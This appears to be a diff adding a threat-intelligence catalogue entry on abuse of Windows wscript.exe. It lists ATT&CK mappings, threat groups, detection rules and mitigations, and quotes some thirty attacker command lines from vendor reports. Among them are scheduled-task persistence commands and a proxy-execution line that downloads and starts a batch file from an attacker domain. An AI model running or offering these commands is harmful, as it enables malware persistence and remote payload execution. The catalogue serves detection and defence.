@@ -1,0 +1,416 @@
+{
+  "type": "lolbin",
+  "version": 2,
+  "id": "60649e15-ca80-4275-b496-e1cd7c378b13",
+  "created_by_ref": "@Nounou_Mbeiri",
+  "created": "2026-10-16T00:16:00.000Z",
+  "modified": "2026-10-16T00:16:00.000Z",
+  "name": "Wscript.exe",
+  "image": "wscript.exe",
+  "description": "Used by Windows to execute scripts",
+  "attack": {
+    "id": "T1059.005",
+    "name": "Visual Basic",
+    "type": "technique",
+    "url": "https://attack.mitre.org/techniques/T1059/005",
+    "version": "20.0"
+  },
+  "summary": [
+    "Execute VBScript and JavaScript payloads",
+    "Execute scripts stored in alternate data streams",
+    "Run scripts from scheduled tasks and Run keys for persistence",
+    "Launch PowerShell commands from a script",
+    "Run under a new name to evade detection"
+  ],
+  "required_privileges": [
+    "User"
+  ],
+  "paths": [
+    "C:\\Windows\\System32\\wscript.exe",
+    "C:\\Windows\\SysWOW64\\wscript.exe"
+  ],
+  "hashes": {
+    "MD5": "0639B0A6F69B3265C1E42227D650B7D1"
+  },
+  "capabilities": [
+    "Execute",
+    "Alternate data streams"
+  ],
+  "platforms": [
+    "windows"
+  ],
+  "associated_kill_chain_phases": [
+    "TA0002:Execution:T1059.005",
+    "TA0002:Execution:T1059.007"
+  ],
+  "relationship": {
+    "associated_apts": [
+      {
+        "name": "Gamaredon Group",
+        "attack_id": "G0047",
+        "evidence": "names wscript.exe",
+        "description": "Gamaredon Group has embedded malicious macros in document templates, which executed VBScript. Gamaredon Group has also delivered Microsoft Outlook VBA projects with embedded macros. Additionally, Gamaredon Group has executed VBScript files using wscript.exe.",
+        "sources": "ESET Gamaredon June 2020 https://www.welivesecurity.com/2020/06/11/gamaredon-group-grows-its-game/; CERT-EE Gamaredon January 2021 https://www.ria.ee/sites/default/files/content-editors/kuberturve/tale_of_gamaredon_infection.pdf; TrendMicro Gamaredon April 2020 https://blog.trendmicro.com/trendlabs-security-intelligence/gamaredon-apt-group-use-covid-19-lure-in-campaigns/; Microsoft Actinium February 2022 https://www.microsoft.com/security/blog/2022/02/04/actinium-targets-ukrainian-organizations/; ESET Gamaredon Sept2024 https://web-assets.esetstatic.com/wls/en/papers/white-papers/cyberespionage-gamaredon-way.pdf; Secureworks IRON TILDEN Profile https://www.secureworks.com/research/threat-profiles/iron-tilden; SymantecCarbonBlack_ShuckwormUSB_Apr2025 https://www.security.com/threat-intelligence/shuckworm-ukraine-gammasteel"
+      },
+      {
+        "name": "Mustang Panda",
+        "attack_id": "G0129",
+        "evidence": "names wscript.exe",
+        "description": "Mustang Panda has executed a JavaScript payload utilizing wscript.exe on the endpoint.",
+        "sources": "Cisco Talos MUSTANG PANDA PLUGX PUBLOAD MAY 2022 https://blog.talosintelligence.com/mustang-panda-targets-europe/"
+      },
+      {
+        "name": "Saint Bear",
+        "attack_id": "G1031",
+        "evidence": "names wscript.exe",
+        "description": "Saint Bear has used the Windows Script Host (wscript) to execute intermediate files written to victim machines.",
+        "sources": "Palo Alto Unit 42 OutSteel SaintBot February 2022  https://unit42.paloaltonetworks.com/ukraine-targeted-outsteel-saintbot/"
+      }
+    ],
+    "associated_campaigns": [
+      {
+        "name": "Operation CuckooBees",
+        "attack_id": "C0012",
+        "evidence": "names wscript.exe",
+        "description": "During Operation CuckooBees, the threat actors executed an encoded VBScript file using `wscript` and wrote the decoded output to a text file.",
+        "sources": "Cybereason OperationCuckooBees May 2022 https://www.cybereason.com/blog/operation-cuckoobees-deep-dive-into-stealthy-winnti-techniques"
+      }
+    ],
+    "associated_malware": [
+      {
+        "name": "KOCTOPUS",
+        "attack_id": "S0669",
+        "evidence": "names wscript.exe",
+        "description": "KOCTOPUS has used VBScript to call wscript to execute a PowerShell command.",
+        "sources": "MalwareBytes LazyScripter Feb 2021 https://web.archive.org/web/20211003035156/https://www.malwarebytes.com/resources/files/2021/02/lazyscripter.pdf"
+      },
+      {
+        "name": "POWERSTATS",
+        "attack_id": "S0223",
+        "evidence": "names wscript.exe",
+        "description": "POWERSTATS has established persistence through a scheduled task using the command ”C:\\Windows\\system32\\schtasks.exe” /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR “c:\\Windows\\system32\\wscript.exe C:\\Windows\\temp\\Windows.vbe”.",
+        "sources": "ClearSky MuddyWater Nov 2018 https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf"
+      }
+    ],
+    "associated_tools": [],
+    "technique_only": [],
+    "associated_commands": [
+      {
+        "command": "wscript.exe //b ％USERPROFILE%\\Documents\\MediaPlayer\\PlayList.vbs",
+        "intent": "Run the obfuscated VBS dropped by the COVID-19 lure's macro; it is also set in a RunOnce key so it runs again at startup.",
+        "status": "verified",
+        "source_name": "TrendMicro Gamaredon April 2020",
+        "source_url": "https://blog.trendmicro.com/trendlabs-security-intelligence/gamaredon-apt-group-use-covid-19-lure-in-campaigns/"
+      },
+      {
+        "command": "wscript.exe C:\\Users\\[username]\\continue.wav //e:VBScript //b",
+        "intent": "Run the DinoTrain stager, a VBScript hidden in a .wav file name.",
+        "status": "verified",
+        "source_name": "Microsoft Actinium February 2022",
+        "source_url": "https://www.microsoft.com/security/blog/2022/02/04/actinium-targets-ukrainian-organizations/"
+      },
+      {
+        "command": "\"C:\\Windows\\System32\\wscript.exe\" //e:vbScript ~.drv",
+        "intent": "Run the VBScript launched from the infected USB drive's shortcut, starting the infection chain.",
+        "status": "verified",
+        "source_name": "SymantecCarbonBlack_ShuckwormUSB_Apr2025",
+        "source_url": "https://www.security.com/threat-intelligence/shuckworm-ukraine-gammasteel"
+      },
+      {
+        "command": "wscript.exe //b /e:jscript %TEMP%\\debug.txt",
+        "intent": "Run the BATELEUR JScript payload, dropped as %TEMP%\\debug.txt by a spear-phishing document.",
+        "status": "verified",
+        "source_name": "FireEye FIN7 Aug 2018",
+        "source_url": "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
+      },
+      {
+        "command": "%WINDIR%\\System32\\Wscript.exe %TEMP%\\WindowsUpdate_X24532\\beginer.vbs",
+        "intent": "Run the VBScript launcher dropped by FIN7's malicious document.",
+        "status": "verified",
+        "source_name": "FireEye FIN7 Aug 2018",
+        "source_url": "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
+      },
+      {
+        "command": "wscript.exe \"Office365DCOMCheck.vbs\" \\\"PowerShell.exe -ExecutionPolicy bypass -WindowStyle hidden -NoProfile '<current PowerShell script>' \\\"",
+        "intent": "Persistence: a scheduled task runs this every five minutes to start the QUADAGENT PowerShell payload hidden.",
+        "status": "verified",
+        "source_name": "Unit 42 QUADAGENT July 2018",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2018/07/unit42-oilrig-targets-technology-service-provider-government-agency-quadagent/"
+      },
+      {
+        "command": "wscript.exe CSIDL_COMMON_APPDATA\\e147c18f9167cd0f\\f30b25c870238567.vbs",
+        "intent": "Persistence: a scheduled task created by Bumblebee runs this VBS every 15 minutes to load the Bumblebee DLL.",
+        "status": "verified",
+        "source_name": "Symantec Bumblebee June 2022",
+        "source_url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bumblebee-loader-cybercrime"
+      },
+      {
+        "command": "wscript.exe CSIDL_PROFILE\\searches\\depended.lnk //e:VBScript //b",
+        "intent": "Run Shuckworm's Pterodo VBS backdoor minutes after the malicious Word document was opened.",
+        "status": "verified",
+        "source_name": "Symantec Shuckworm January 2022",
+        "source_url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-gamaredon-espionage-ukraine"
+      },
+      {
+        "command": "SchTasks /Create /SC MINUTE /MO 3 /TN \"InetlSecurityAssistManager\" /TR \"wscript %path%\" /f",
+        "intent": "Persistence: the OopsIE Trojan creates a scheduled task that runs itself every three minutes through a VBScript.",
+        "status": "verified",
+        "source_name": "Unit 42 OopsIE! Feb 2018",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2018/02/unit42-oopsie-oilrig-uses-threedollars-deliver-new-trojan/"
+      },
+      {
+        "command": "%windir%\\System32\\wscript.exe //e:vbscript //b <path_to_Stage_2>",
+        "intent": "Run the stage 2 VBScript dropped by the malicious document's macro.",
+        "status": "verified",
+        "source_name": "Talos Kimsuky Nov 2021",
+        "source_url": "https://blog.talosintelligence.com/2021/11/kimsuky-abuses-blogs-delivers-malware.html"
+      },
+      {
+        "command": "wscript.exe C:\\Users\\[USERNAME]\\AppData\\Local\\Temp\\nvidia-drivers\\update.vbs",
+        "intent": "Persistence: a Run key starts this VBS at logon in Lazarus's fake interview (ClickFake) campaign.",
+        "status": "verified",
+        "source_name": "Sekoia ClickFake 2025",
+        "source_url": "https://blog.sekoia.io/clickfake-interview-campaign-by-lazarus/"
+      },
+      {
+        "command": "cmd.exe /c Wscript.exe \"C:\\Users\\[REDACTED]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\news.js\"",
+        "intent": "Persistence: run a script placed in the Startup folder after the attackers' tunnelling attempts failed.",
+        "status": "verified",
+        "source_name": "Trend Micro Muddy Water March 2021",
+        "source_url": "https://www.trendmicro.com/en_us/research/21/c/earth-vetala---muddywater-continues-to-target-organizations-in-t.html"
+      },
+      {
+        "command": "WScript.exe \"%system32%\\SyncAppvPublishingServer.vbs\" \"n;cmd.exe '/c curl perseus[.]bond/Dgy_0dU08lC/hCHEdlDFGV/P89bXhClww/uiOHK5H35B/bM%3D -A cur1-agent -o %public%\\regsile.bat & start /b %public%\\regsile.bat'",
+        "intent": "Proxy execution: abuse the signed SyncAppvPublishingServer.vbs to download and start a batch file with curl.",
+        "status": "verified",
+        "source_name": "Securelist BlueNoroff MotW bypass December 2022",
+        "source_url": "https://securelist.com/bluenoroff-methods-bypass-motw/108383/"
+      },
+      {
+        "command": "schtasks /create /sc MINUTE /tn \"Windows Scheduled MaintenBa\" /tr \"wscript %userProfile%\\AppData\\Local\\Microsoft\\microsoft.vbs\" /mo 10 /F",
+        "intent": "The Rancor DLL loader runs a command that creates a scheduled task running the dropped microsoft.vbs with wscript every 10 minutes.",
+        "status": "verified",
+        "source_name": "Unit 42 Rancor June 2018",
+        "source_url": "https://unit42.paloaltonetworks.com/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/"
+      },
+      {
+        "command": "\"C:\\Windows\\system32\\schtasks.exe\" /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR \"c:\\windows\\system32\\ wscript.exe C:\\Windows\\temp\\ Windows.vbe \"",
+        "intent": "The POWERSTATS backdoor keeps persistence with a scheduled task named MicrosoftEdge that runs daily at 12:00 and starts the three-step backdoor execution with wscript running Windows.vbe.",
+        "status": "verified",
+        "source_name": "ClearSky MuddyWater Lebanon and Oman November 2018",
+        "source_url": "https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf"
+      },
+      {
+        "command": "schtasks.exe <remotehost> /TN joke /TR \\\"wscript.exe C:\\\\Users\\\\Public\\\\obamka.js\\\" /sc once /st 00:00 /RL HIGHEST",
+        "intent": "BlackByte copies itself to a remote host as obamka.js and creates a scheduled task on that host that runs the file with wscript.exe.",
+        "status": "verified",
+        "source_name": "Trustwave BlackByte Ransomware Pt 1 October 2021",
+        "source_url": "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/blackbyte-ransomware-pt-1-in-depth-analysis/"
+      },
+      {
+        "command": "cmd /c WMIC Process Call Create \"C:\\Windows\\System32\\Wscript.exe //NOLOGO %TEMP%\\C-PDC-C-Cpy-T.vbs\"",
+        "intent": "The Shamoon variant executes the dropped C-PDC-C-Cpy-T.vbs through WMIC to copy the malware into the Chrome folder under ProgramData.",
+        "status": "verified",
+        "source_name": "Kaspersky From Shamoon to StoneDrill March 2017",
+        "source_url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf"
+      },
+      {
+        "command": "\"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\roaming\\reflect.rar //e:VBScript //b",
+        "intent": "Two additional VBS scripts were observed being executed via depended.exe, the Pterodo backdoor downloaded by the first VBS file.",
+        "status": "verified",
+        "source_name": "Symantec Shuckworm January 2022",
+        "source_url": "https://www.security.com/threat-intelligence/shuckworm-gamaredon-espionage-ukraine"
+      },
+      {
+        "command": "SCHTASKS /CREATE /sc minute /mo 10 /tn \"deep-thoughted\" /tr \"wscript.exe \" CSIDL_COMMON_PICTURES\\deep-thoughted.ppt //e:VBScript //b\" /F",
+        "intent": "A scheduled task runs the dropped VBS file deep-thoughted.ppt every 10 minutes to persist across reboots.",
+        "status": "verified",
+        "source_name": "Symantec Shuckworm January 2022",
+        "source_url": "https://www.security.com/threat-intelligence/shuckworm-gamaredon-espionage-ukraine"
+      },
+      {
+        "command": "\"CSIDL_SYSTEM\\schtasks.exe\" /CREATE /sc minute /mo 12 /tn \"MediaConverter\" /tr \"wscript.exe \" CSIDL_COMMON_MUSIC\\tvplaylist.mov //e:VBScript //b \" /F\"",
+        "intent": "Two additional scheduled tasks are created, this one running the VBS file tvplaylist.mov every 12 minutes, installed together with a new Pterodo variant.",
+        "status": "verified",
+        "source_name": "Symantec Shuckworm January 2022",
+        "source_url": "https://www.security.com/threat-intelligence/shuckworm-gamaredon-espionage-ukraine"
+      },
+      {
+        "command": "\"C:\\Windows\\System32\\wscript.exe\" \"\"C:\\Users\\Public\\NTUSER.DAT.TMContainer00000000000000000001.regtrans-ms\"\" //e:vbscript //b /numerousIOC",
+        "intent": "After mshta launched the first command, wscript ran two VBS files that the obfuscated ~.drv created; the first contacts the command and control server.",
+        "status": "verified",
+        "source_name": "Symantec Shuckworm GammaSteel April 2025",
+        "source_url": "https://www.security.com/threat-intelligence/shuckworm-ukraine-gammasteel"
+      },
+      {
+        "command": "wscript C:\\ProgramData\\WindowsAppPool\\AppPool.vbs",
+        "intent": "The malicious macro finishes by running the dropped VBScript AppPool.vbs with wscript.",
+        "status": "verified",
+        "source_name": "Unit 42 OilRig BONDUPDATER September 2018",
+        "source_url": "https://unit42.paloaltonetworks.com/unit42-oilrig-uses-updated-bondupdater-target-middle-eastern-government/"
+      },
+      {
+        "command": "cmd.exe /C schtasks /create /F /sc minute /mo 1 /tn \"\\WindowsAppPool\\AppPool\" /tr \"wscript /b \"C:\\ProgramData\\WindowsAppPool\\AppPool.vbs\"\"",
+        "intent": "AppPool.vbs creates a scheduled task that runs it every minute through wscript, giving BONDUPDATER persistence.",
+        "status": "verified",
+        "source_name": "Unit 42 OilRig BONDUPDATER September 2018",
+        "source_url": "https://unit42.paloaltonetworks.com/unit42-oilrig-uses-updated-bondupdater-target-middle-eastern-government/"
+      },
+      {
+        "command": "cmd /c schtasks.exe /create /tn \"Lodging\" /tr \"wscript //B 'C:\\Users\\<username>\\AppData\\Local\\Innovative Analytics Solutions\\Quantifyr.js'\" /sc minute /mo 5 /F",
+        "intent": "SectopRAT created a scheduled task named Lodging for persistence that runs the script Quantifyr.js every five minutes.",
+        "status": "verified",
+        "source_name": "Trend Micro Lumma Stealer GitHub Delivery January 2025",
+        "source_url": "https://www.trendmicro.com/en_us/research/25/a/lumma-stealers-github-based-delivery-via-mdr.html"
+      },
+      {
+        "command": "wscript.exe //B “C:\\Users\\Lucas\\AppData\\Roaming\\tk.vbs”",
+        "intent": "Where the second VBS script was not dropped in the startup folder, persistence is set through Run registry keys that launch tk.vbs with wscript.exe.",
+        "status": "verified",
+        "source_name": "Lab52 LazyScripter March 2022",
+        "source_url": "https://lab52.io/blog/very-very-lazy-lazyscripters-scripts-double-compromise-in-a-single-obfuscation/"
+      },
+      {
+        "command": "schtasks /create /TN Chrome_Update /TR \"C:\\Windows\\System32\\wscript.exe /b \"\"%appdata%\\bot.vbe\"\"\" /SC MINUTE /mo 15 /f exit",
+        "intent": "The first PowerShell script returned by the C&C server registers a scheduled task named Chrome_Update that runs bot.vbe every 15 minutes.",
+        "status": "verified",
+        "source_name": "ENKI Kimsuky Remote Control Tools August 2026",
+        "source_url": "https://www.enki.co.kr/en/media-center/blog/inside-kimsuky-s-abuse-of-legitimate-remote-control-tools-across-northeast-asia"
+      },
+      {
+        "command": "wscript.exe /b “C:\\windirr\\11.vbs”",
+        "intent": "The scheduled task XML runs the VBS file 11.vbs every 17 minutes, and 11.vbs then executes pp.ps1.",
+        "status": "verified",
+        "source_name": "ASEC Kimsuky Malicious LNK Python Backdoor March 2026",
+        "source_url": "https://asec.ahnlab.com/en/93151/"
+      },
+      {
+        "command": "start wscript.exe /b \"\"%appdata%\\1.vbs",
+        "intent": "The command is placed in the arguments of modified browser and Outlook shortcuts so that each launch saves and runs the remote script t1.hta as %appdata%\\1.vbs.",
+        "status": "verified",
+        "source_name": "ASEC Kimsuky Batch File Disguised as Document Viewer June 2023",
+        "source_url": "https://asec.ahnlab.com/en/55219/"
+      },
+      {
+        "command": "\"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\<username>\\AppData\\Local\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm\\LocalState\\Sessions\\<session_identifier>\\Transfers\\<YYYY-MM>\\financial reports(s).vbs\"",
+        "intent": "Command line observed when the user opens the malicious VBScript attachment from WhatsApp Desktop, which starts the first stage that retrieves further VBScript components.",
+        "status": "verified",
+        "source_name": "Kaspersky WhatsApp VBS Campaign June 2026",
+        "source_url": "https://securelist.com/whatsapp-vbs-rmm-campaign/120290/"
+      }
+    ]
+  },
+  "detections": {
+    "eventsid": [
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 1,
+        "data_components": "Process Creation",
+        "techniques": "T1059.005, T1059.007"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 7,
+        "data_components": "Module Load",
+        "techniques": "T1059.005, T1059.007"
+      }
+    ],
+    "sigma_rules": [
+      {
+        "title": "WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/process_creation/proc_creation_win_wscript_cscript_script_exec.yml"
+      },
+      {
+        "title": "WScript or CScript Dropper - File",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_cscript_wscript_dropper.yml"
+      },
+      {
+        "title": "Local Network Connection Initiated By Script Interpreter",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/network_connection/net_connection_win_wscript_cscript_local_connection.yml"
+      },
+      {
+        "title": "Outbound Network Connection Initiated By Script Interpreter",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/network_connection/net_connection_win_wscript_cscript_outbound_connection.yml"
+      },
+      {
+        "title": "Potential Dropper Script Execution Via WScript/CScript/MSHTA",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_wscript_cscript_mshta_dropper.yml"
+      },
+      {
+        "title": "Cscript/Wscript Uncommon Script Extension Execution",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_wscript_cscript_uncommon_extension_exec.yml"
+      }
+    ],
+    "related_sigma_rules": 104,
+    "other_rules": [
+      "https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_unusual_dir_ads.toml",
+      "https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/command_and_control_remote_file_copy_scripts.toml",
+      "https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml",
+      "https://github.com/splunk/security_content/blob/a1afa0fa605639cbef7d528dec46ce7c8112194a/detections/endpoint/wscript_or_cscript_suspicious_child_process.yml"
+    ]
+  },
+  "related_CVE": [],
+  "mitigations": [
+    {
+      "id": "M1042",
+      "name": "Disable or Remove Feature or Program",
+      "technique": "T1059.005"
+    },
+    {
+      "id": "M1038",
+      "name": "Execution Prevention",
+      "technique": "T1059.005"
+    },
+    {
+      "id": "M1021",
+      "name": "Restrict Web-Based Content",
+      "technique": "T1059.005"
+    },
+    {
+      "id": "M1040",
+      "name": "Behavior Prevention on Endpoint",
+      "technique": "T1059.005"
+    },
+    {
+      "id": "M1049",
+      "name": "Antivirus/Antimalware",
+      "technique": "T1059.005"
+    },
+    {
+      "id": "M1021",
+      "name": "Restrict Web-Based Content",
+      "technique": "T1059.007"
+    },
+    {
+      "id": "M1040",
+      "name": "Behavior Prevention on Endpoint",
+      "technique": "T1059.007"
+    },
+    {
+      "id": "M1038",
+      "name": "Execution Prevention",
+      "technique": "T1059.007"
+    },
+    {
+      "id": "M1042",
+      "name": "Disable or Remove Feature or Program",
+      "technique": "T1059.007"
+    }
+  ],
+  "additional_mitigations": [],
+  "references": [
+    "https://attack.mitre.org/techniques/T1059/005",
+    "https://lolbas-project.github.io/lolbas/Binaries/Wscript/",
+    "https://strontic.github.io/xcyclopedia/library/wscript.exe-0639B0A6F69B3265C1E42227D650B7D1.html"
+  ],
+  "sources": {
+    "attack": "MITRE ATT&CK Enterprise v20.0",
+    "sigma": "SigmaHQ commit 7d8b152a5fc062ebd309f62ae4d8276aca2786af (rules under DRL 1.1)"
+  }
+}
